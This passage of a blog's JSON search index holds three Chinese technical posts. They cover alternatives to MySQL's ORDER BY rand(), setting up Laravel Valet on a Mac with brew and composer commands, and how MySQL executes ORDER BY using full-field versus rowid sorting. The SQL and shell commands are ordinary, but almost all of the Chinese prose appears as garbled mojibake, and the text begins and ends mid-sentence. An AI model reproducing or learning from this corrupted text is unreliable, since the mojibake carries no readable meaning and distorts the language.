rowid å°±æ˜¯ç”±ç³»ç»Ÿç”Ÿæˆçš„ï¼› MEMORY å¼•æ“ä¸æ˜¯ç´¢å¼•ç»„ç»‡è¡¨ã€‚åœ¨è¿™ä¸ªä¾‹å­é‡Œé¢ï¼Œä½ å¯ä»¥è®¤ä¸ºå®ƒå°±æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚å› æ­¤ï¼Œè¿™ä¸ª rowid å…¶å®å°±æ˜¯æ•°ç»„çš„ä¸‹æ ‡ order by rand() ä½¿ç”¨äº†å†…å­˜ä¸´æ—¶è¡¨ï¼Œå†…å­˜ä¸´æ—¶è¡¨æ’åºçš„æ—¶å€™ä½¿ç”¨äº† rowid æ’åºæ–¹æ³•ã€‚ ç£ç›˜ä¸´æ—¶è¡¨é‚£ä¹ˆï¼Œæ˜¯ä¸æ˜¯æ‰€æœ‰çš„ä¸´æ—¶è¡¨éƒ½æ˜¯å†…å­˜è¡¨å‘¢ï¼Ÿ å…¶å®ä¸æ˜¯çš„ã€‚tmp_table_size è¿™ä¸ªé…ç½®é™åˆ¶äº†å†…å­˜ä¸´æ—¶è¡¨çš„å¤§å°ï¼Œé»˜è®¤å€¼æ˜¯ 16Mã€‚å¦‚æœä¸´æ—¶è¡¨å¤§å°è¶…è¿‡äº† tmp_table_sizeï¼Œé‚£ä¹ˆå†…å­˜ä¸´æ—¶è¡¨å°±ä¼šè½¬æˆç£ç›˜ä¸´æ—¶è¡¨ã€‚ ç£ç›˜ä¸´æ—¶è¡¨ä½¿ç”¨çš„å¼•æ“é»˜è®¤æ˜¯ InnoDBï¼Œæ˜¯ç”±å‚æ•° internal_tmp_disk_storage_engine æ§åˆ¶çš„ã€‚ éšæœºæ’åºæ–¹æ³•æˆ‘ä»¬å…ˆæŠŠé—®é¢˜ç®€åŒ–ä¸€ä¸‹ï¼Œå¦‚æœåªéšæœºé€‰æ‹© 1 ä¸ª word å€¼ï¼Œå¯ä»¥æ€ä¹ˆåšå‘¢ï¼Ÿæ€è·¯ä¸Šæ˜¯è¿™æ ·çš„ï¼š å–å¾—è¿™ä¸ªè¡¨çš„ä¸»é”® id çš„æœ€å¤§å€¼ M å’Œæœ€å°å€¼ N ç”¨éšæœºå‡½æ•°ç”Ÿæˆä¸€ä¸ªæœ€å¤§å€¼åˆ°æœ€å°å€¼ä¹‹é—´çš„æ•° X = (M-N)*rand() + N å–ä¸å°äº X çš„ç¬¬ä¸€ä¸ª ID çš„è¡Œ è¿™ä¸ªç®—æ³•æš‚æ—¶ç§°ä½œéšæœºç®—æ³• 1ã€‚ä¸‹é¢æ˜¯æ‰§è¡Œè¯­å¥çš„åºåˆ—ï¼š 123select max(id),min(id) into @M,@N from words ;set @X&#x3D; floor((@M-@N+1)*rand() + @N);select * from words where id &gt;&#x3D; @X limit 1; è¿™ä¸ªæ–¹æ³•æ•ˆç‡å¾ˆé«˜ï¼Œå› ä¸ºå– max(id) å’Œ min(id) éƒ½æ˜¯ä¸éœ€è¦æ‰«æç´¢å¼•çš„ï¼Œè€Œç¬¬ä¸‰æ­¥çš„ select ä¹Ÿå¯ä»¥ç”¨ç´¢å¼•å¿«é€Ÿå®šä½ï¼Œå¯ä»¥è®¤ä¸ºå°±åªæ‰«æäº† 3 è¡Œã€‚ä½†å®é™…ä¸Šï¼Œè¿™ä¸ªç®—æ³•æœ¬èº«å¹¶ä¸ä¸¥æ ¼æ»¡è¶³é¢˜ç›®çš„éšæœºè¦æ±‚ï¼Œå› ä¸º ID ä¸­é—´å¯èƒ½æœ‰ç©ºæ´ï¼Œå› æ­¤é€‰æ‹©ä¸åŒè¡Œçš„æ¦‚ç‡ä¸ä¸€æ ·ï¼Œä¸æ˜¯çœŸæ­£çš„éšæœºã€‚ æ¯”å¦‚ä½ æœ‰ 4 ä¸ª idï¼Œåˆ†åˆ«æ˜¯ 1ã€2ã€4ã€5ï¼Œå¦‚æœæŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå–åˆ° id=4 çš„è¿™ä¸€è¡Œçš„æ¦‚ç‡æ˜¯å–å¾—å…¶ä»–è¡Œæ¦‚ç‡çš„ä¸¤å€ã€‚ å¦‚æœè¿™å››è¡Œçš„ id åˆ†åˆ«æ˜¯ 1ã€2ã€40000ã€40001 å‘¢ï¼Ÿè¿™ä¸ªç®—æ³•åŸºæœ¬å°±èƒ½å½“ bug æ¥çœ‹å¾…äº†ã€‚ æ‰€ä»¥ï¼Œä¸ºäº†å¾—åˆ°ä¸¥æ ¼éšæœºçš„ç»“æœï¼Œå¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªæµç¨‹: å–å¾—æ•´ä¸ªè¡¨çš„è¡Œæ•°ï¼Œå¹¶è®°ä¸º C å–å¾— Y = floor(C * rand())ã€‚ floor å‡½æ•°åœ¨è¿™é‡Œçš„ä½œç”¨ï¼Œå°±æ˜¯å–æ•´æ•°éƒ¨åˆ† å†ç”¨ limit Y,1 å–å¾—ä¸€è¡Œ è¿™ä¸ªç®—æ³•æš‚æ—¶ç§°ä½œéšæœºç®—æ³• 2ã€‚ä¸‹é¢æ˜¯æ‰§è¡Œè¯­å¥çš„åºåˆ—ï¼š 1234567select count(*) into @C from words;set @Y &#x3D; floor(@C * rand());set @sql &#x3D; concat(&quot;select * from words limit &quot;, @Y, &quot;,1&quot;);prepare stmt from @sql;execute stmt;DEALLOCATE prepare stmt; ç”±äº limit åé¢çš„å‚æ•°ä¸èƒ½ç›´æ¥è·Ÿå˜é‡ï¼Œæ‰€ä»¥ä¸Šè¿°æ‰§è¡Œåºåˆ—ä¸­ï¼Œä½¿ç”¨äº† prepare+execute çš„æ–¹æ³•ã€‚ä½ ä¹Ÿå¯ä»¥æŠŠæ‹¼æ¥ SQL è¯­å¥çš„æ–¹æ³•å†™åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œä¼šæ›´ç®€å•äº›ã€‚ ç°åœ¨å†çœ‹çœ‹ï¼Œå¦‚æœæŒ‰ç…§éšæœºç®—æ³• 2 çš„æ€è·¯ï¼Œè¦éšæœºå– 3 ä¸ª word å€¼å‘¢ï¼Ÿä½ å¯ä»¥è¿™ä¹ˆåšï¼š å–å¾—æ•´ä¸ªè¡¨çš„è¡Œæ•°ï¼Œè®°ä¸º Cï¼› æ ¹æ®ç›¸åŒçš„éšæœºæ–¹æ³•å¾—åˆ° Y1ã€Y2ã€Y3ï¼› å†æ‰§è¡Œä¸‰ä¸ª limit Y, 1 è¯­å¥å¾—åˆ°ä¸‰è¡Œæ•°æ®ã€‚ æŠŠè¿™ä¸ªç®—æ³•ï¼Œç§°ä½œéšæœºç®—æ³• 3ã€‚ä¸‹é¢æ˜¯æ‰§è¡Œè¯­å¥çš„åºåˆ—ï¼š 123456789select count(*) into @C from t;set @Y1 &#x3D; floor(@C * rand());set @Y2 &#x3D; floor(@C * rand());set @Y3 &#x3D; floor(@C * rand());# åœ¨åº”ç”¨ä»£ç é‡Œé¢å– Y1ã€Y2ã€Y3 å€¼ï¼Œæ‹¼å‡º SQL åæ‰§è¡Œselect * from t limit @Y1ï¼Œ1ï¼›select * from t limit @Y2ï¼Œ1ï¼›select * from t limit @Y3ï¼Œ1; æ€»ç»“ é‡åˆ°éšæœºæ’åºéœ€æ±‚æ—¶ï¼Œåº”å°½é‡é¿å…ä½¿ç”¨ order by rand()ï¼Œå› ä¸ºè¿™ä¸ªè¯­å¥éœ€è¦ Using temporary å’Œ Using filesortï¼ŒæŸ¥è¯¢çš„æ‰§è¡Œä»£ä»·å¾€å¾€æ˜¯æ¯”è¾ƒå¤§çš„ã€‚ æ­£ç¡®çš„åšæ³•åº”è¯¥æ˜¯ï¼Œä½¿ç”¨åé¢çš„å‡ ä¸ªç®—æ³•æ–¹æ¡ˆï¼Œé€šè¿‡æ‹¼æ¥ SQL è¯­å¥ï¼Œè·å–é¢„æœŸçš„ç»“æœé›†ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"è½»é‡çº§å¼€å‘ç¯å¢ƒ Valet å¿«é€Ÿä¸Šæ‰‹","slug":"get-started-quickly-with-the-lightweight-development-environment-valet","date":"2022-08-08T10:31:34.000Z","updated":"2023-02-18T03:28:33.580Z","comments":true,"path":"get-started-quickly-with-the-lightweight-development-environment-valet/","link":"","permalink":"https://www.0x2beace.com/get-started-quickly-with-the-lightweight-development-environment-valet/","excerpt":"Valet æ˜¯ä¸º Mac æä¾›çš„æç®€ä¸»ä¹‰å¼€å‘ç¯å¢ƒï¼Œæ²¡æœ‰ Vagrant ï¼Œä¹Ÿæ— éœ€ /etc/hosts æ–‡ä»¶ï¼Œç”šè‡³å¯ä»¥ä½¿ç”¨æœ¬åœ°éš§é“å…¬å¼€å…±äº«ä½ çš„ç«™ç‚¹ã€‚Laravel Valet ä¼šåœ¨ä½ çš„ Mac ä¸Šå°† Nginx è®¾ç½®ä¸ºéšç³»ç»Ÿå¯åŠ¨åå°è¿è¡Œï¼Œç„¶åä½¿ç”¨ DnsMasq ï¼Œ Valet å°†æ‰€æœ‰çš„è¯·æ±‚ä»£ç†åˆ° *.test åŸŸåå¹¶æŒ‡å‘æœ¬åœ°å®‰è£…çš„ç«™ç‚¹ç›®å½•ã€‚æ¢å¥è¯è¯´ï¼Œä¸€ä¸ªé€Ÿåº¦æå¿«çš„ Laravel å¼€å‘ç¯å¢ƒä»…ä»…éœ€è¦å ç”¨ 7MB å†…å­˜ã€‚ Valet å¹¶ä¸æ˜¯æƒ³è¦æ›¿ä»£ Vagrant æˆ–è€… Homesteadï¼Œåªæ˜¯æä¾›å¦å¤–ä¸€ç§é€‰æ‹©ï¼Œæ›´åŠ çµæ´»ã€æ–¹ä¾¿ã€ä»¥åŠå ç”¨æ›´å°çš„å†…å­˜ã€‚","text":"Valet æ˜¯ä¸º Mac æä¾›çš„æç®€ä¸»ä¹‰å¼€å‘ç¯å¢ƒï¼Œæ²¡æœ‰ Vagrant ï¼Œä¹Ÿæ— éœ€ /etc/hosts æ–‡ä»¶ï¼Œç”šè‡³å¯ä»¥ä½¿ç”¨æœ¬åœ°éš§é“å…¬å¼€å…±äº«ä½ çš„ç«™ç‚¹ã€‚Laravel Valet ä¼šåœ¨ä½ çš„ Mac ä¸Šå°† Nginx è®¾ç½®ä¸ºéšç³»ç»Ÿå¯åŠ¨åå°è¿è¡Œï¼Œç„¶åä½¿ç”¨ DnsMasq ï¼Œ Valet å°†æ‰€æœ‰çš„è¯·æ±‚ä»£ç†åˆ° *.test åŸŸåå¹¶æŒ‡å‘æœ¬åœ°å®‰è£…çš„ç«™ç‚¹ç›®å½•ã€‚æ¢å¥è¯è¯´ï¼Œä¸€ä¸ªé€Ÿåº¦æå¿«çš„ Laravel å¼€å‘ç¯å¢ƒä»…ä»…éœ€è¦å ç”¨ 7MB å†…å­˜ã€‚ Valet å¹¶ä¸æ˜¯æƒ³è¦æ›¿ä»£ Vagrant æˆ–è€… Homesteadï¼Œåªæ˜¯æä¾›å¦å¤–ä¸€ç§é€‰æ‹©ï¼Œæ›´åŠ çµæ´»ã€æ–¹ä¾¿ã€ä»¥åŠå ç”¨æ›´å°çš„å†…å­˜ã€‚ å®‰è£… Valetæ­£å¼å®‰è£…ä¹‹å‰ï¼Œé¦–å…ˆæ›´æ–°ä¸€ä¸‹ Homebrewã€‚ 1brew update ç„¶åå®‰è£…å„ç‰ˆæœ¬çš„ PHPï¼š 12345brew install shivammathur/php/php@7.3brew install shivammathur/php/php@7.2brew install shivammathur/php/php@7.1brew install shivammathur/php/php@7.0brew install shivammathur/php/php@5.6 è¿™é‡Œå®‰è£…å¤šä¸ªç‰ˆæœ¬çš„ç›®çš„æ˜¯ï¼Œä¸ºåç»­åˆ‡æ¢ç‰ˆæœ¬åšå‡†å¤‡ã€‚ å®‰è£…å®Œ PHP ä¹‹åï¼Œå°±å¯ä»¥ä½¿ç”¨ Composer äº†ï¼Œå°† Valet ä½œä¸ºå…¨å±€æœåŠ¡è¿›è¡Œå®‰è£…ã€‚ 1composer global require laravel/valet å®‰è£…å®Œ Valet ä¹‹åï¼Œè¿˜ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œéœ€è¦å®‰è£… Valet æ‰€ä¾èµ–çš„æœåŠ¡ï¼ˆDnsMasqï¼‰ã€‚ 1valet install ç›´åˆ°ä¸Šä¸€æ­¥å®Œæˆï¼Œæ•´ä¸ªå®‰è£…è¿‡ç¨‹ç»ˆäºç»“æŸäº†ã€‚ ä¸ºäº†éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸï¼Œå¯ä»¥ ping ä¸€ä¸‹ *.test çš„ä»»æ„åŸŸåï¼Œå¦‚æœå¯ä»¥ ping é€šå¹¶çœ‹åˆ° 127.0.0.1ï¼Œåˆ™è¡¨ç¤ºæœåŠ¡æ­£å¸¸ã€‚ ç«™ç‚¹ç»´æŠ¤ä½¿ç”¨ Valet åˆ›å»ºä¸€ä¸ªç«™ç‚¹æœ‰ä¸¤ç§æ–¹å¼ï¼š valet link valet park ä¸Šé¢ä¸¤ä¸ªå‘½ä»¤éƒ½å¯ä»¥åˆ›å»ºä¸€ä¸ªç«™ç‚¹ï¼Œvalet park ç®—æ˜¯ valet link å‘½ä»¤çš„å‡çº§ç‰ˆï¼Œå¯ä»¥ä¸€æ¬¡åˆ›å»º N å„ç«™ç‚¹ã€‚ valet linkå¿«é€Ÿåˆ›å»ºä¸€ä¸ªç«™ç‚¹ï¼š 123# cd /Users/boo/.config/valet/Sites/localhost è¿›å…¥é¡¹ç›®è·Ÿè·¯å¾„$ valet link localhostA [localhost] symbolic link has been created in [/Users/boo/.config/valet/Sites/localhost]. åªéœ€è¦ä¸€ä¸ªå‘½ä»¤ï¼Œä¸€ä¸ªç«™ç‚¹å°±åˆ›å»ºå¥½äº†ï¼š æŸ¥çœ‹ç«™ç‚¹åˆ—è¡¨ï¼š 123456$ valet links+-----------------------+-----+-----------------------------------+-----------------------------------------------------------------------+| Site | SSL | URL | Path |+-----------------------+-----+-----------------------------------+-----------------------------------------------------------------------+| localhost | | http://localhost.test | /Users/boo/Projects/localhost| +-----------------------+-----+-----------------------------------+-----------------------------------------------------------------------+ åˆ é™¤ä¸€ä¸ªç«™ç‚¹ï¼š 1$ valet unlink localhost valet parkå½“æŸä¸ªç›®å½•ä¸‹é¢æœ‰å¤šä¸ªé¡¹ç›®éœ€è¦åˆ›å»ºç«™ç‚¹æ—¶ï¼Œä½¿ç”¨ valet park å°¤ä¸ºæ–¹ä¾¿ã€‚ 123# cd /Users/boo/Sites è¿›å…¥é¡¹ç›®è·Ÿè·¯å¾„$ valet parkThis directory has been added to Valet's paths. ä½¿ç”¨ valet parked å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ‰€æœ‰ä½¿ç”¨ park æ·»åŠ çš„ç«™ç‚¹ï¼š 12345678valet parked+-----------+-----+-----------------------+----------------------------+| Site | SSL | URL | Path |+-----------+-----+-----------------------+----------------------------+| blog | | http://blog.test | /Users/boo/Sites/blog || localhost | | http://localhost.test | /Users/boo/Sites/localhost || phpinfo | | http://phpinfo.test | /Users/boo/Sites/phpinfo |+-----------+-----+-----------------------+----------------------------+ å¦‚æœæƒ³æŠŠæŸä¸ªç›®å½•ä¸‹é¢çš„æ‰€æœ‰ç«™ç‚¹éƒ½ç§»é™¤ï¼Œå¯ä»¥ä½¿ç”¨ valet forget å‘½ä»¤ï¼Œç„¶åå‰ææ˜¯è¿™äº›ç«™ç‚¹éƒ½æ˜¯ä½¿ç”¨ park æ–¹å¼æ·»åŠ çš„ã€‚ valet paths å‘½ä»¤åˆ™æ˜¯ç”¨æ¥æŸ¥çœ‹æ‰€æœ‰ä½¿ç”¨ valet park æ·»åŠ ç«™ç‚¹çš„è·Ÿè·¯å¾„ã€‚ 12345valet paths[ \"/Users/boo/.config/valet/Sites\", \"/Users/boo/Sites\",] åˆ‡æ¢ç‰ˆæœ¬Valet åˆ‡æ¢ PHP ç‰ˆæœ¬éå¸¸æ–¹ä¾¿ï¼Œå› ä¸ºå‰é¢å·²ç»å®‰è£…å¥½äº†å¤šç‰ˆæœ¬çš„ PHPï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œåˆ‡æ¢ï¼š 1valet use php@7.3 å…¶ä»–å‘½ä»¤Valet å¸¸ç”¨å‘½ä»¤ å‘½ä»¤ æè¿° valet log ä» Valet çš„æœåŠ¡ä¸­æŸ¥çœ‹æ—¥å¿— valet restart é‡å¯ Valet å®ˆæŠ¤è¿›ç¨‹ valet start å¼€å¯ Valet å®ˆæŠ¤è¿›ç¨‹ valet stop åœæ­¢ Valet å®ˆæŠ¤è¿›ç¨‹ valet trust ä¸º Brew å’Œ Valet æ·»åŠ æ–‡ä»¶ä¿®æ”¹æƒé™ä½¿ Valet è¾“å…¥å‘½ä»¤çš„æ—¶å€™ä¸éœ€è¦è¾“å…¥å¯†ç  valet uninstall å®Œæˆå¸è½½ Valet å®ˆæŠ¤è¿›ç¨‹ valet use php@7.2 åˆ‡æ¢PHP ç‰ˆæœ¬ valet tld app åˆ‡æ¢é¡¶çº§åŸŸå å‚è€ƒé“¾æ¥ Laravel Valet","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Mac","slug":"PHP/Mac","permalink":"https://www.0x2beace.com/categories/PHP/Mac/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"16 order byæ˜¯æ€ä¹ˆå·¥ä½œçš„","slug":"how-does-order-by-work","date":"2022-07-04T12:59:02.000Z","updated":"2023-02-18T03:28:33.600Z","comments":true,"path":"how-does-order-by-work/","link":"","permalink":"https://www.0x2beace.com/how-does-order-by-work/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£MySQL é‡Œé¢ order by è¯­å¥çš„å‡ ç§ç®—æ³•æµç¨‹ äº†è§£å‡ è€…ä¹‹é—´çš„åŒºåˆ«","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£MySQL é‡Œé¢ order by è¯­å¥çš„å‡ ç§ç®—æ³•æµç¨‹ äº†è§£å‡ è€…ä¹‹é—´çš„åŒºåˆ« å…¨å­—æ®µæ’åºä»å‰é¢çš„å†…å®¹ä¸­äº†è§£åˆ°äº†ï¼Œä¸ºäº†é¿å…å…¨è¡¨æ‰«çŒ«ï¼Œä¼šåœ¨ç›¸å…³çš„å­—æ®µä¸Šå¢åŠ ç´¢å¼•ã€‚ å‡è®¾æœ‰ä¸€å¼ è¿™æ ·çš„è¡¨ï¼š 123456789CREATE TABLE &#96;t&#96; ( &#96;id&#96; int(11) NOT NULL, &#96;city&#96; varchar(16) NOT NULL, &#96;name&#96; varchar(16) NOT NULL, &#96;age&#96; int(11) NOT NULL, &#96;addr&#96; varchar(128) DEFAULT NULL, PRIMARY KEY (&#96;id&#96;), KEY &#96;city&#96; (&#96;city&#96;)) ENGINE&#x3D;InnoDB; å¯¹äºä¸‹é¢è¿™ä¸ªè¯­å¥ï¼Œç´¢å¼•åœ¨ city å­—æ®µä¸Šé¢ï¼Œæˆ‘ä»¬ç”¨ explain å‘½ä»¤æ¥çœ‹çœ‹è¿™ä¸ªè¯­å¥çš„æ‰§è¡Œæƒ…å†µã€‚ 1select city,name,age from t where city&#x3D;&#39;æ­å·&#39; order by name limit 1000; Extra è¿™ä¸ªå­—æ®µä¸­çš„â€œUsing filesortâ€è¡¨ç¤ºçš„å°±æ˜¯éœ€è¦æ’åºï¼ŒMySQL ä¼šç»™æ¯ä¸ªçº¿ç¨‹åˆ†é…ä¸€å—å†…å­˜ç”¨äºæ’åºï¼Œç§°ä¸º sort_bufferã€‚ ä¸ºäº†è¯´æ˜è¿™ä¸ª SQL æŸ¥è¯¢è¯­å¥çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹ city è¿™ä¸ªç´¢å¼•çš„ç¤ºæ„å›¾ã€‚ ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ»¡è¶³ city=â€™æ­å·â€™æ¡ä»¶çš„è¡Œï¼Œæ˜¯ä» ID_X åˆ° ID_(X+N) çš„è¿™äº›è®°å½•ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªè¯­å¥æ‰§è¡Œæµç¨‹å¦‚ä¸‹æ‰€ç¤º ï¼š åˆå§‹åŒ– sort_bufferï¼Œç¡®å®šæ”¾å…¥ nameã€cityã€age è¿™ä¸‰ä¸ªå­—æ®µ ä»ç´¢å¼• city æŸ¥æ‰¾ç¬¬ä¸€ä¸ªæ»¡è¶³ city=â€æ­å·â€ è¿™ä¸ªæ¡ä»¶çš„ä¸»é”® idï¼Œä¹Ÿå°±æ˜¯å›¾ä¸­çš„ ID_X åˆ°ä¸»é”® ID ç´¢å¼•å–å‡ºæ•´è¡Œï¼Œå– nameã€cityã€age ä¸‰ä¸ªå­—æ®µçš„å€¼ï¼Œå­˜å…¥ sort_buffer ä¸­ ä»ç´¢å¼• city æŸ¥æ‰¾ä¸‹ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„ä¸»é”® ID é‡å¤æ­¥éª¤ä¸‰ã€æ­¥éª¤å››ï¼Œç›´åˆ° city çš„å€¼ä¸æ»¡è¶³æŸ¥è¯¢æ¡ä»¶ä¸ºæ­¢ï¼Œå¯¹åº”çš„ä¸»é”® id ä¹Ÿå°±æ˜¯å›¾ä¸­çš„ ID_Y å¯¹ sort_buffer ä¸­çš„æ•°æ®æŒ‰ç…§å­—æ®µ name åšå¿«é€Ÿæ’åº æŒ‰ç…§æ’åºç»“æœå–å‰ 1000 è¡Œè¿”å›ç»™å®¢æˆ·ç«¯ æš‚ä¸”æŠŠè¿™ä¸ªæ’åºè¿‡ç¨‹ï¼Œç§°ä¸ºå…¨å­—æ®µæ’åºï¼Œæ‰§è¡Œæµç¨‹çš„ç¤ºæ„å›¾å¦‚ä¸‹æ‰€ç¤ºï¼Œä¸‹ä¸€ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬è¿˜ä¼šç”¨åˆ°è¿™ä¸ªæ’åºã€‚ å›¾ä¸­â€œæŒ‰ name æ’åºâ€è¿™ä¸ªåŠ¨ä½œï¼Œå¯èƒ½åœ¨å†…å­˜ä¸­å®Œæˆï¼Œä¹Ÿå¯èƒ½éœ€è¦ä½¿ç”¨å¤–éƒ¨æ’åºï¼Œè¿™å–å†³äºæ’åºæ‰€éœ€çš„å†…å­˜å’Œå‚æ•° sort_buffer_sizeã€‚ sort_buffer_sizeï¼Œå°±æ˜¯ MySQL ä¸ºæ’åºå¼€è¾Ÿçš„å†…å­˜ï¼ˆsort_bufferï¼‰çš„å¤§å°ã€‚å¦‚æœè¦æ’åºçš„æ•°æ®é‡å°äº sort_buffer_sizeï¼Œæ’åºå°±åœ¨å†…å­˜ä¸­å®Œæˆã€‚ä½†å¦‚æœæ’åºæ•°æ®é‡å¤ªå¤§ï¼Œå†…å­˜æ”¾ä¸ä¸‹ï¼Œåˆ™ä¸å¾—ä¸åˆ©ç”¨ç£ç›˜ä¸´æ—¶æ–‡ä»¶è¾…åŠ©æ’åºã€‚ rowid æ’åºåœ¨ä¸Šé¢è¿™ä¸ªç®—æ³•è¿‡ç¨‹é‡Œé¢ï¼Œåªå¯¹åŸè¡¨çš„æ•°æ®è¯»äº†ä¸€éï¼Œå‰©ä¸‹çš„æ“ä½œéƒ½æ˜¯åœ¨ sort_buffer å’Œä¸´æ—¶æ–‡ä»¶ä¸­æ‰§è¡Œçš„ã€‚ä½†è¿™ä¸ªç®—æ³•æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å¦‚æœæŸ¥è¯¢è¦è¿”å›çš„å­—æ®µå¾ˆå¤šçš„è¯ï¼Œé‚£ä¹ˆ sort_buffer é‡Œé¢è¦æ”¾çš„å­—æ®µæ•°å¤ªå¤šï¼Œè¿™æ ·å†…å­˜é‡Œèƒ½å¤ŸåŒæ—¶æ”¾ä¸‹çš„è¡Œæ•°å¾ˆå°‘ï¼Œè¦åˆ†æˆå¾ˆå¤šä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œæ’åºçš„æ€§èƒ½ä¼šå¾ˆå·®ã€‚ æ‰€ä»¥å¦‚æœå•è¡Œå¾ˆå¤§ï¼Œè¿™ä¸ªæ–¹æ³•æ•ˆç‡ä¸å¤Ÿå¥½ï¼Œ æ–°çš„ç®—æ³•æ”¾å…¥ sort_buffer çš„å­—æ®µï¼Œåªæœ‰è¦æ’åºçš„åˆ—ï¼ˆå³ name å­—æ®µï¼‰å’Œä¸»é”® idã€‚ ä½†è¿™æ—¶ï¼Œæ’åºçš„ç»“æœå°±å› ä¸ºå°‘äº† city å’Œ age å­—æ®µçš„å€¼ï¼Œä¸èƒ½ç›´æ¥è¿”å›äº†ï¼Œæ•´ä¸ªæ‰§è¡Œæµç¨‹å°±å˜æˆå¦‚ä¸‹æ‰€ç¤ºçš„æ ·å­ï¼š åˆå§‹åŒ– sort_bufferï¼Œç¡®å®šæ”¾å…¥ä¸¤ä¸ªå­—æ®µï¼Œå³ name å’Œ id ä»ç´¢å¼• city æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ»¡è¶³ city=â€™æ­å·â€™æ¡ä»¶çš„ä¸»é”® idï¼Œä¹Ÿå°±æ˜¯å›¾ä¸­çš„ ID_X åˆ°ä¸»é”® id ç´¢å¼•å–å‡ºæ•´è¡Œï¼Œå– nameã€id è¿™ä¸¤ä¸ªå­—æ®µï¼Œå­˜å…¥ sort_buffer ä¸­ ä»ç´¢å¼• city å–ä¸‹ä¸€ä¸ªè®°å½•çš„ä¸»é”® id é‡å¤æ­¥éª¤ 3ã€4 ç›´åˆ°ä¸æ»¡è¶³ city=â€™æ­å·â€™æ¡ä»¶ä¸ºæ­¢ï¼Œä¹Ÿå°±æ˜¯å›¾ä¸­çš„ ID_Y å¯¹ sort_buffer ä¸­çš„æ•°æ®æŒ‰ç…§å­—æ®µ name è¿›è¡Œæ’åº éå†æ’åºç»“æœï¼Œå–å‰ 1000 è¡Œï¼Œå¹¶æŒ‰ç…§ id çš„å€¼å›åˆ°åŸè¡¨ä¸­å–å‡º cityã€name å’Œ age ä¸‰ä¸ªå­—æ®µè¿”å›ç»™å®¢æˆ·ç«¯ è¿™ä¸ªæ‰§è¡Œæµç¨‹çš„ç¤ºæ„å›¾å¦‚ä¸‹ï¼Œæš‚ä¸”æŠŠè¿™ä¸ªæ’åºè¿‡ç¨‹ï¼Œç§°ä¸º rowid æ’åº å¯¹æ¯”ä¸Šé¢çš„å…¨å­—æ®µæ’åºæµç¨‹å›¾å¯ä»¥å‘ç°ï¼Œrowid æ’åºå¤šè®¿é—®äº†ä¸€æ¬¡è¡¨ t çš„ä¸»é”®ç´¢å¼•ï¼Œä¹Ÿå°±æ˜¯æ­¥éª¤ 7ã€‚ å…¨å­—æ®µæ’åº VS rowid æ’åºä¸¤ç§æ’åºæ–¹å¼çš„åŒºåˆ«ï¼š å¦‚æœ MySQL å®åœ¨æ˜¯æ‹…å¿ƒæ’åºå†…å­˜å¤ªå°ï¼Œä¼šå½±å“æ’åºæ•ˆç‡ï¼Œæ‰ä¼šé‡‡ç”¨ rowid æ’åºç®—æ³•ï¼Œè¿™æ ·æ’åºè¿‡ç¨‹ä¸­ä¸€æ¬¡å¯ä»¥æ’åºæ›´å¤šè¡Œï¼Œä½†æ˜¯éœ€è¦å†å›åˆ°åŸè¡¨å»å–æ•°æ®ã€‚ å¦‚æœ MySQL è®¤ä¸ºå†…å­˜è¶³å¤Ÿå¤§ï¼Œä¼šä¼˜å…ˆé€‰æ‹©å…¨å­—æ®µæ’åºï¼ŒæŠŠéœ€è¦çš„å­—æ®µéƒ½æ”¾åˆ° sort_buffer ä¸­ï¼Œè¿™æ ·æ’åºåå°±ä¼šç›´æ¥ä»å†…å­˜é‡Œé¢è¿”å›æŸ¥è¯¢ç»“æœäº†ï¼Œä¸ç”¨å†å›åˆ°åŸè¡¨å»å–æ•°æ®ã€‚ è¿™ä¹Ÿå°±ä½“ç°äº† MySQL çš„ä¸€ä¸ªè®¾è®¡æ€æƒ³ï¼šå¦‚æœå†…å­˜å¤Ÿï¼Œå°±è¦å¤šåˆ©ç”¨å†…å­˜ï¼Œå°½é‡å‡å°‘ç£ç›˜è®¿é—®ã€‚ å¯¹äº InnoDB è¡¨æ¥è¯´ï¼Œrowid æ’åºä¼šè¦æ±‚å›è¡¨å¤šé€ 